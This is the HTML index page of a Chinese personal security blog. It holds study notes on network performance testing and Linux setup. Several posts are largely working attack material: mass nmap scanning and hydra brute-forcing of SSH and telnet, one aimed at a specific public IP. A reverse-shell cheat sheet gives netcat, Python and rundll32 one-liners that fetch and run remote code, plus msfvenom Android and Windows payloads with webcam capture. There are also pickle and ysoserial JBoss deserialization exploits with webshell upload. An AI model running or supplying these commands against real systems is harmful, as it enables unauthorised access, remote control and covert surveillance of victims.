<!doctype html>
<html class="theme-next use-motion ">
<head>
  

<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>




<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>




  <meta name="keywords" content="Hexo,next" />





  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />


<meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="FengGe">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="FengGe">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="FengGe">
<meta name="twitter:description">


<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'hide'
  };
</script>

  <title> FengGe </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  



  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><h1 class="site-meta">
  <span class="logo-line-before"><i></i></span>
  <a href="/" class="brand" rel="start">
      <span class="logo">
        <i class="icon-next-logo"></i>
      </span>
      <span class="site-title">FengGe</span>
  </a>
  <span class="logo-line-after"><i></i></span>
</h1>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu menu-left">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            <i class="menu-item-icon icon-next-home"></i> <br />
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            <i class="menu-item-icon icon-next-categories"></i> <br />
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            <i class="menu-item-icon icon-next-about"></i> <br />
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            <i class="menu-item-icon icon-next-archives"></i> <br />
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            <i class="menu-item-icon icon-next-tags"></i> <br />
            标签
          </a>
        </li>
      

      
      
        <li class="menu-item menu-item-search">
          <a href="#" class="st-search-show-outputs">
            <i class="menu-item-icon icon-next-search"></i> <br />
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  

<script type="text/javascript">
  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

  _st('install', '1xA5nmofbVyis7g7i4th','2.0.0');
</script>



    </div>
  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content"> 
  <section id="posts" class="posts-expand">
    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2016/02/25/性能测试学习-1/" itemprop="url">
                性能测试学习-1
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2016-02-25T15:27:18+08:00" content="2016-02-25">
            2016-02-25
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2016/02/25/性能测试学习-1/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2016/02/25/性能测试学习-1/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p>近来状态不佳，学的东西杂乱无章，也没能及时有效的总结，先放一放安全，从头开始总结下性能测试</p>
<h2 id="点对点带宽测试">点对点带宽测试</h2><p>用到的工具iperf</p>
<pre><code>apt-get install iperf <span class="hexcolor">#deb</span>ian系统，windows下载安装包进行安装

#服务端运行
iperf -f M -s
#客户端运行
iperf<span class="class">.exe</span> -f M -c <span class="number">192.168</span>.<span class="number">51.145</span> -t <span class="number">10</span> -<span class="tag">i</span> <span class="number">1</span>
</code></pre><p>测得公司内网实际传输速度在11.5Mbytes左右，11.5(实际速度)*8=92(带宽)，推测内网为百兆带宽</p>
<p>看一下windows机器支持的网卡最大速度：<br>    控制面板–网络连接–本地连接（属性）–配置（常规下面）–高级（找speed&amp;duplex）–右边下拉菜单里看有那些选项（最大为100M）<br>又查了一下树莓派自带网口的网卡速度，结果也是100M…</p>
<p>又想到网关设</p>
<p>在这个场景下测出来的是本机-&gt;服务器的带宽</p>
<h2 id="一次简单的GET请求">一次简单的GET请求</h2><p>编辑网页内容 1234567890 发送一次GET请求 抓包看看大小</p>
<pre><code>场景A:本机-&gt;服务器  <span class="number">66</span>+<span class="number">54</span>+<span class="number">524</span>+<span class="number">54</span>=<span class="number">698</span>bytes <span class="preprocessor">#<span class="number">3</span>个TCP，<span class="number">1</span>个http请求（上行）</span>
场景B:服务器-&gt;本机  <span class="number">66</span>+<span class="number">60</span>+<span class="number">349</span>=<span class="number">475</span>bytes    <span class="preprocessor">#<span class="number">2</span>个TCP，<span class="number">1</span>个http响应（下行）</span>
</code></pre><p>从这些信息里可以分析出什么呢？</p>
<pre><code><span class="number">1.</span>如果是宽带瓶颈应该出现在上行的方向即场景A，宽带承受最大理论值为 <span class="number">11.5</span>*<span class="number">1024</span>*<span class="number">1024</span>/<span class="number">698</span> 约等于 <span class="number">17275</span>，即每秒钟可通过<span class="number">17275</span>个请求。
<span class="number">2.</span>还可以分析出正常情况下，场景A吞吐率/场景B吞吐率应约为<span class="number">3</span>/<span class="number">2</span>，如远大于<span class="number">3</span>/<span class="number">2</span>可以推测服务器出现性能瓶颈。
<span class="number">3.</span>如果场景A的带宽始终没有被占满，但压力机的cpu，内存各项占用比例很大则可能是压力机到达了瓶颈。
</code></pre><h2 id="jmeter压力实测">jmeter压力实测</h2><p>apache的配置情况：</p>
<pre><code><span class="preprocessor">#工作模式：</span>
cd /etc/apache2/mods-enabled/ 
<span class="preprocessor">#查看Apache2启动时载入哪些模块，发现载入了prefork的工作模式</span>
vim mpm_prefork.conf
<span class="preprocessor">#看一下相关配置</span>
&lt;IfModule mpm_prefork_module&gt;
    StartServers                  <span class="number">5</span>
    MinSpareServers               <span class="number">5</span>
    MaxSpareServers              <span class="number">10</span>
    MaxRequestWorkers             <span class="number">150</span>
    MaxConnectionsPerChild       <span class="number">0</span>
&lt;/IfModule&gt;

<span class="preprocessor">#apache配置：</span>
KeepAlive On
MaxKeepAliveRequests <span class="number">100</span>
</code></pre><p>测试结果：</p>
<table>
<thead>
<tr>
<th>并发数</th>
<th>平均事务响应时间</th>
<th>cpu-user</th>
<th>cpu-sys</th>
<th>packin</th>
<th>packout</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>12</td>
<td>20</td>
<td>2</td>
<td>455</td>
<td>720</td>
</tr>
<tr>
<td>2</td>
<td>12</td>
<td>35</td>
<td>4.5</td>
<td>780</td>
<td>1300</td>
</tr>
<tr>
<td>3</td>
<td>13</td>
<td>51</td>
<td>7</td>
<td>1161</td>
<td>1160</td>
</tr>
<tr>
<td>4</td>
<td>13</td>
<td>68</td>
<td>10</td>
<td>1400</td>
<td>2270</td>
</tr>
<tr>
<td>5</td>
<td>14</td>
<td>75</td>
<td>14</td>
<td>1534</td>
<td>2444</td>
</tr>
<tr>
<td>6</td>
<td>19</td>
<td>82</td>
<td>17</td>
<td>1570</td>
<td>2500</td>
</tr>
<tr>
<td>7</td>
<td>21</td>
<td>81</td>
<td>16</td>
<td>1615</td>
<td>2610</td>
</tr>
<tr>
<td>8</td>
<td>24</td>
<td>83.5</td>
<td>16</td>
<td>1671</td>
<td>2641</td>
</tr>
<tr>
<td>10</td>
<td>28</td>
<td>80</td>
<td>19</td>
<td>1647</td>
<td>2770</td>
</tr>
</tbody>
</table>
<p>说明：</p>
<pre><code><span class="number">1.</span>在<span class="number">5</span>并发左右时吞吐量达到最大，其中每个包的大小约为<span class="number">1475</span>bytes，即(<span class="number">1475</span>/<span class="number">1024</span>)kb*<span class="number">2770</span>=<span class="number">3998</span>kb，约为<span class="number">4</span>MB/s（packout*packsize）
<span class="number">2.</span>可以看到开启<span class="number">7</span>个线程时发包和接包个数达到峰值，并不会随着压力机进程的增加而增加，推测瓶颈出现在压力机（*待解决*）。
<span class="number">3.</span>本次测试只是简单一问一答的请求，去除了网页中的js,css及一些图片的请求，在实际测试的过程中不应去除这些内容。
<span class="number">4.</span>目测nmon的outsize数据是根据Trans比上发包数算出来的。
</code></pre></span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2016/02/18/范围爆破常见服务/" itemprop="url">
                范围爆破常见服务
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2016-02-18T11:13:12+08:00" content="2016-02-18">
            2016-02-18
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2016/02/18/范围爆破常见服务/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2016/02/18/范围爆破常见服务/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p>记录一下常见端口的爆破姿势，用到了nmap的一些脚本，爆破工具hydra，以及自己写的一些脚本。</p>
<h2 id="Ubuntu_14版_32位系统">Ubuntu 14版 32位系统</h2><p>安装nmap，hydra</p>
<pre><code>apt-get <span class="operator"><span class="keyword">install</span> nmap 
apt-<span class="keyword">get</span> <span class="keyword">install</span> hydra hydra-gtk</span>
</code></pre><h2 id="nmap搜集信息">nmap搜集信息</h2><p>以22端口为例</p>
<pre><code><span class="keyword">nmap</span> -<span class="keyword">v</span> -<span class="keyword">sn</span> -PE -<span class="keyword">n</span> --<span class="built_in">min</span>-hostgroup <span class="number">1024</span> --<span class="built_in">min</span>-parallelism <span class="number">1024</span> -oG nmap_output IP/<span class="number">16</span>
#扫下<span class="keyword">b</span>段，把存活主机筛选出来
<span class="keyword">cat</span> nmap_output | <span class="keyword">grep</span> Up |awk <span class="string">'{print $2}'</span> &gt; target_alive
#将存活主机IP筛选出来，进一步扫描识别服务
<span class="keyword">nmap</span> -sS -<span class="keyword">p</span> <span class="number">22</span> -oG nmap_output -iL target_alive
#读取上一步中存活主机列表，扫描<span class="number">22</span>端口或者用下一条直接扫一个<span class="keyword">c</span>段
<span class="keyword">nmap</span> -sS -<span class="keyword">p</span> <span class="number">22</span> -oG nmap_output IP/<span class="number">24</span>
#扫描<span class="keyword">c</span>段下开放<span class="number">22</span>端口的服务
<span class="keyword">cat</span> nmap_output | <span class="keyword">grep</span> <span class="keyword">open</span> |awk <span class="string">'{print $2}'</span>  &gt; target_ssh
#筛选
</code></pre><p>说明：<br>1.第一条指令执行速度较快，目的是快速判断大范围的存活主机，提高扫描效率。<br>2.使用该指令扫描靶机vps的B段IP，促发了保护机制，结果攻击VPS直接被DDOS打挂了<br>3.关于第一条命令详解参见李姐姐的博客<br>4.关于nmap一些其他姿势可参考nmap科学使用方法</p>
<p><a href="http://www.lijiejie.com/nmap-fast-scan-large-networks/" target="_blank" rel="external">李姐姐的博客</a><br><a href="http://blog.jobbole.com/54595/" target="_blank" rel="external">nmap科学使用方法</a></p>
<h2 id="爆破ssh">爆破ssh</h2><pre><code>hydra -M target_ssh ssh -s port -L username<span class="class">.txt</span> -P password<span class="class">.txt</span> -t <span class="number">50</span>
#-M读取爆破目标，-s为指定爆破端口，-t为运行的线程数默认为<span class="number">16</span>
hydra IP ssh -s port -L username<span class="class">.txt</span> -P password<span class="class">.txt</span> -t <span class="number">50</span>
#直接用IP爆破
</code></pre><h2 id="爆破telnet">爆破telnet</h2><pre><code>hydra <span class="number">123.103</span><span class="number">.58</span><span class="number">.186</span> telnet -l admin -p admin -t <span class="number">1</span> -s <span class="number">23</span> -e ns -f -V
<span class="preprocessor">#-s之后的参数不知道有啥用~用到了再研究</span>
</code></pre><p>总结：基本思路就是使用nmap获得爆破目标(ftp,ssh,smtp,pop,mysql…)并处理，用hydra对目标进行爆破。</p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2016/01/28/linux基本配置/" itemprop="url">
                linux基本配置
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2016-01-28T09:11:27+08:00" content="2016-01-28">
            2016-01-28
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2016/01/28/linux基本配置/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/28/linux基本配置/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p>之前在linux下安东西的时候，太过依赖于使用工具安装，导致东西都安进了挂载在根目录的磁盘下，导致磁盘空间被占满而又不敢乱删东西，折腾了一天，最终选择了重装系统，这次好好做一下分区，安装的软件也尽量进行统一管理。</p>
<p>1.用户管理</p>
<pre><code><span class="preprocessor">#新建用户</span>
useradd username
passwd username

vi /etc/ssh/sshd_config
<span class="preprocessor">#Port改下端口，PermitRootLogin改为no</span>

service ssh restart
</code></pre><p>2.磁盘分区及挂载</p>
<pre><code>df 
fdisk -l 
<span class="preprocessor">#看看磁盘的挂载情况和所有的磁盘信息，这里发现xvdb这个磁盘还没有用上</span>

mkfs -t ext3 /dev/xvdb <span class="preprocessor">#格式化成ext3文件系统  </span>
fdisk /dev/xvdb        <span class="preprocessor">#分区其中p：打印分区情况n：添加 </span>

Device Boot      Start         End      Blocks   Id  System
/dev/xvdb1           <span class="number">1</span>         <span class="number">600</span>     <span class="number">4819468</span>+  <span class="number">83</span>  Linux
/dev/xvdb2         <span class="number">601</span>        <span class="number">1600</span>     <span class="number">8032500</span>   <span class="number">83</span>  Linux
/dev/xvdb3        <span class="number">1601</span>        <span class="number">2610</span>     <span class="number">8112825</span>   <span class="number">83</span>  Linux

mkfs -t ext2 /dev/xvdb1 <span class="preprocessor">#转换文件格式<span class="number">1.2</span><span class="number">.3</span>都需要做</span>
mount /dev/xvdb1 /workspace <span class="preprocessor">#放一些自己写的脚本</span>
mount /dev/xvdb2 /app         <span class="preprocessor">#东西在这安</span>
mount /dev/xvdb3 /backup    <span class="preprocessor">#备份</span>

vi /etc/fstab  <span class="preprocessor">#添加以下<span class="number">3</span>行信息</span>
/dev/xvdb1        /workspace        ext2    defaults        <span class="number">1</span> <span class="number">2</span>
/dev/xvdb2        /app                 ext2    defaults        <span class="number">1</span> <span class="number">2</span>
/dev/xvdb3        /backup             ext2    defaults        <span class="number">1</span> <span class="number">2</span>
</code></pre><p>3.安装必要软件</p>
<p>安装gcc，make</p>
<pre><code>yum <span class="keyword">install</span> gcc make
</code></pre><p>安装Python2.7</p>
<pre><code>wget http:<span class="comment">//python.org/ftp/python/2.7.3/Python-2.7.3.tar.bz2  </span>
tar -jxvf Python-<span class="number">2.7</span><span class="number">.3</span>.tar.bz2  
cd Python-<span class="number">2.7</span><span class="number">.3</span>  
./configure --prefix=/app/python2<span class="number">.7</span>
make &amp;&amp; make install
mv /usr/bin/python /usr/bin/python2<span class="number">.6</span><span class="number">.6</span>  
ln -s /app/python2<span class="number">.7</span>/bin/python2<span class="number">.7</span> /usr/bin/python  

vi /usr/bin/yum   <span class="preprocessor">#yum不支持python2<span class="number">.7</span>坑爹啊</span>
改成<span class="preprocessor">#!/usr/bin/python2<span class="number">.6</span><span class="number">.6</span></span>
</code></pre><p>安装git</p>
<pre><code>yun <span class="keyword">install</span> git --setopt=prefix=/app/git <span class="comment">#使用setopt参数安装到指定目录</span>
</code></pre><p>用python2.6安装easy_install</p>
<pre><code>mv <span class="regexp">/usr/</span>bin<span class="regexp">/python2.6.6 /u</span>sr<span class="regexp">/bin/</span>python
yum install python-setuptool
easy_isntall pip
</code></pre></span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2016/01/11/反弹shell的各种姿势/" itemprop="url">
                shell的各种姿势
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2016-01-11T15:32:41+08:00" content="2016-01-11">
            2016-01-11
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2016/01/11/反弹shell的各种姿势/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/11/反弹shell的各种姿势/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p>渗透过程中经常会有需要反弹shell，为什么要用到反弹shell，我们的目标主机在没有外网IP但可以和外网进行通信的时候可以使用反弹shell使其主动连接一个外网服务，我们可以通过编写这个服务来达到各种目的。在这里记录一下正向及反弹shell的各种姿势。</p>
<h2 id="NetCat反弹shell">NetCat反弹shell</h2><pre><code><span class="comment">#服务端</span>
nc -l -p <span class="number">1234</span> -e /bin/sh   <span class="comment">#目标主机为linux系统</span>
nc -l -p <span class="number">1234</span> -e <span class="constant">C</span><span class="symbol">:/Windows/System/cmd</span>.exe <span class="comment">#目标主机为Windows系统</span>

<span class="comment">#目标主机</span>
nc ip <span class="number">1234</span>
</code></pre><h2 id="msf反弹shell安卓">msf反弹shell安卓</h2><pre><code>payload生成木马

shell&gt; msfvenom -l #查看可用payload
shell&gt; msfvenom -<span class="tag">p</span> windows/x64/shell/reverse_tcp LHOST=ip LPORT=port -f exe -o /var/www/shell<span class="class">.exe</span>                #生成exe文件放到windows系统
msfvenom -<span class="tag">p</span> android/meterpreter/reverse_tcp LHOST=ip  LPORT=port -o /var/www/<span class="number">1234</span><span class="class">.apk</span> #放到手机安装

进入msfconsole
msf &gt; use multi/handler
msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt;  set payload windows/x64/shell/reverse_tcp
msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt;  set LHOST <span class="number">0.0</span>.<span class="number">0.0</span>
msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt;    set LPORT port
msf <span class="function"><span class="title">exploit</span><span class="params">(handler)</span></span> &gt;  exploit

meterpreter&gt; webcam_snap -<span class="tag">i</span> <span class="number">2</span> -<span class="tag">p</span> /var/www/<span class="number">1</span><span class="class">.jap</span>   #照一张照片放在根目录
</code></pre><h2 id="python反弹shell">python反弹shell</h2><pre><code>在服务器端监听<span class="number">1234</span>
nc -l <span class="number">1234</span>
在攻击目标运行
<span class="built_in">#</span>linux系统
python -c '<span class="built_in">import</span> socket,subprocess,os;s=socket.socket<span class="params">(socket.AF_INET,socket.SOCK_STREAM)</span>;s.connect<span class="params">(<span class="params">(<span class="string">"10.0.0.1"</span>,<span class="number">1234</span>)</span>)</span>;os.dup2<span class="params">(s.fileno<span class="params">()</span>,<span class="number">0</span>)</span>; os.dup2<span class="params">(s.fileno<span class="params">()</span>,<span class="number">1</span>)</span>; os.dup2<span class="params">(s.fileno<span class="params">()</span>,<span class="number">2</span>)</span>;p=subprocess.call<span class="params">([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span>;'
</code></pre><h2 id="rundll-exe加载js反弹shell">rundll.exe加载js反弹shell</h2><p><a href="http://drops.wooyun.org/tips/11764" target="_blank" rel="external">JavaScript Backdoor</a>–三好学生</p>
<pre><code><span class="preprocessor">#window服务器上运行ps1脚本</span>
https:<span class="comment">//gist.github.com/subTee/f1603fa5c15d5f8825c0</span>

<span class="preprocessor">#攻击目标机器上执行</span>

rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"GET"</span>,<span class="string">"http://192.168.174.131/connect"</span>,<span class="literal">false</span>);<span class="keyword">try</span>{h.Send();B=h.ResponseText;eval(B);}<span class="keyword">catch</span>(e{<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,<span class="literal">true</span>);}
</code></pre></span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2016/01/05/谈谈序列化和反序列化的问题/" itemprop="url">
                谈谈序列化和反序列化引发的问题
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2016-01-05T09:57:28+08:00" content="2016-01-05">
            2016-01-05
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2016/01/05/谈谈序列化和反序列化的问题/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/05/谈谈序列化和反序列化的问题/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><blockquote>
<p>数据和操作指令保存在一起不加区分，从而容易被误解</p>
</blockquote>
<p>1.序列化和反序列化简介<br>2.python演示反序列化利用姿势<br>3.java演示利用姿势<br>4.相关EXP</p>
<h2 id="序列化和反序列化简介">序列化和反序列化简介</h2><p>个人理解的序列化就是把数据，这个数据可以是广义上的对象（万物皆对象），按照一定的规则输出纯文本。反序列化的过程就是将序列化的纯文本的按照一定的规则解析，还原场景的过程。当然一套序列化和反序列话的规则应该是对应的，例如python中的cpickle模块，java中的ObjectOutputStream，ObjectInputStream类，php中的serialize()函数。为了跨平台，跨语言可以将数据序列化成xml，json的格式进行传输。<br>在序列化和反序列化的过程，如果被别有用心的人利用，构造恶意序列化文本发送给程序，程序解析了这个文本之后便可以执行攻击者构造的操作指令，其危害不言而喻。</p>
<h2 id="python演示反序列化利用姿势">python演示反序列化利用姿势</h2><pre><code>import cPickle 

data = <span class="string">"test"</span> <span class="instruction">
packed </span>=<span class="function"> cPickle.dumps(</span>data<span class="function">)</span> <span class="comment"># 序列化 </span>
data =<span class="function"> cPickle.loads(</span>packed<span class="function">)</span> <span class="comment"># 反序列化 </span>

&gt;&gt;&gt;<span class="instruction"> packed </span>
<span class="string">"S'test'\np1\n."</span>
&gt;&gt;&gt; data
<span class="string">"test"</span>
</code></pre><p>以上是简单的python序列化和反序列化的过程,但是如何让我们构造的packed自动执行呢，在python中有一些函数会在反序列化的时候自动执行，例如<strong>reduce函数，我们就可以把要执行的指令写进</strong>reduce函数：</p>
<pre><code><span class="comment">#构造恶意序列化文本</span>
<span class="prompt">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span> 
            a = <span class="number">1</span> 
             b = <span class="number">2</span> 
        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span> 
            <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">'cmd.exe'</span>,),)) 

<span class="prompt">&gt;&gt;&gt; </span>cPickle.dumps(A()) 
<span class="string">"csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n."</span>

<span class="comment">#模拟服务端解析</span>
<span class="prompt">&gt;&gt;&gt; </span>cPickle.loads(<span class="string">"csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n."</span>) 
&lt;subprocess.Popen object at <span class="number">0x00BB8DD0</span>&gt; 
<span class="prompt">&gt;&gt;&gt; </span>Microsoft Windows XP [版本 <span class="number">5.1</span><span class="number">.2600</span>] 
(C) 版权所有 <span class="number">1985</span>-<span class="number">2001</span> Microsoft Corp. 

C:\Documents <span class="keyword">and</span> Settings\testuser&gt;exit
Use exit() <span class="keyword">or</span> Ctrl-Z plus Return to exit 
&gt;&gt;&gt;
</code></pre><h2 id="java演示利用姿势">java演示利用姿势</h2><p>java反序列化的过程可能造成的安全问题和python的过程类似，关于近来比较火热的weblogic，jboss等web容器的反序列化相关漏洞，老外放出了构造payload的脚本ysoserial，这里以jboss为例，做一下重现。</p>
<p>在VPS上安装jboss</p>
<pre><code>apt-get install java-<span class="number">1.7</span><span class="number">.0</span>-openjdk-devel -y 
wget -O jboss-<span class="number">4.2</span><span class="number">.3</span>.zip http:<span class="comment">//sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA-jdk6.zip/download </span>
unzip jboss-<span class="number">4.2</span><span class="number">.3</span>.zip
cd /home/jboss/bin
./run.sh -b <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>                   <span class="preprocessor">#运行在<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span>上</span>
</code></pre><p>下载构造脚本，构造payload</p>
<pre><code>wget https:<span class="comment">//github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar </span>
java -jar ysoserial-<span class="number">0.0</span>.<span class="number">2</span>-all<span class="class">.jar</span> CommonsCollections1 <span class="string">'mkdir /home/jj'</span> &gt; /home/payload
curl --<span class="tag">header</span> <span class="string">'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue'</span> --data-binary <span class="string">'@/home/payload'</span> http:<span class="comment">//0.0.0.0:8080/invoker/JMXInvokerServlet</span>
</code></pre><p>列出home目录</p>
<pre><code><span class="title">ls</span> /home                 <span class="comment">#发现执行了 mkdir /home/jj</span>
</code></pre><h2 id="相关EXP">相关EXP</h2><pre><code><span class="preprocessor">#使用ls回显命令查找jboss根目录</span>
ls ../server/<span class="keyword">default</span>/deploy/jboss-web.deployer/ROOT.war

<span class="preprocessor">#上传</span>
ls ../server/<span class="keyword">default</span>/deploy/jboss-web.deployer/ROOT.war/test.jsp

<span class="preprocessor">#菜刀连接</span>
http:<span class="comment">//ip:port/test.jsp</span>
</code></pre><h2 id="参考">参考</h2><p><a href="http://zone.wooyun.org/content/23847" target="_blank" rel="external">关于java unserialize rce 一些细节和jboss rce 实践</a><br><a href="http://drops.wooyun.org/papers/66" target="_blank" rel="external">Python Pickle反序列化带来的安全问题</a><br><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a><br><a href="http://drops.wooyun.org/papers/10801" target="_blank" rel="external">从反序列化到命令执行 - Java 中的 POP 执行链</a></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/12/30/Apache2-module内容学习/" itemprop="url">
                Apache2-module内容学习
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2015-12-30T10:59:53+08:00" content="2015-12-30">
            2015-12-30
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2015/12/30/Apache2-module内容学习/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/30/Apache2-module内容学习/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p>出现了需要在现有的apache环境中单独安装Apache官方系统模块（mod_cache）的需求。</p>
<p>关于Apache的模块，个人理解和现在应用的插件形式类似，例如chrome，插件丰富了浏览器的功能，用户可以根据自己的需要选择安装插件 。网上对于Apache2模块配置的资料也是零零散散，在这里记录下学习配置过程。</p>
